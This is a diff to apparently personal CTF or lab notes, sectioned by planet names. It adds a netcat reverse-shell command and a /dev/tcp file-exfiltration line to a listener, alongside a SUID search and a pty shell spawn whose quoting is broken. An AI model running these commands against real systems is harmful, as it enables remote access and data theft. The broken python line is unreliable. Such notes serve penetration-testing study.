@@ -2,11 +2,12 @@ Mercury:
 
 Earth:
 Spawn a bash shell old ver:
+nc -e /bin/bash <listener> 3333
 python -c "import pty; pty.spawn("bash")'
 Find files with permission:
 find / -perm -u=s -ls 2>/dev/null
 Send a file: 
-Sender: nc <ip> <port> < filename
+Sender: nc <ip> <port> < filename *or* cat /path/to/file > /dev/tcp/<listener>/3333
 Reciever: nc -lnvp > filename
 Venus:
 
